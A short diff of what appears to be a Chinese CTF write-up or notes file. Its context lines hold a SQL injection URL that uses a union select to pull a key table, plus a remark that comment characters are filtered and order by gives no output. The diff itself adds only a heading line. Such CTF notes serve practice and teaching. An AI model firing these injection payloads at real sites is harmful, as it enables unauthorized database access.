@@ -233,3 +233,4 @@ show_source(__FILE__);
 sql注入
 `http://hazelshishuaige.club:9111/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d67' union select 1,(select group_concat(haha) from hazel.IS_KEY),3,4,5,6 and '1'='1`
 过滤了注释符，爆列数得用union select，order by 无回显
+[嘤嘤嘤]P6_2
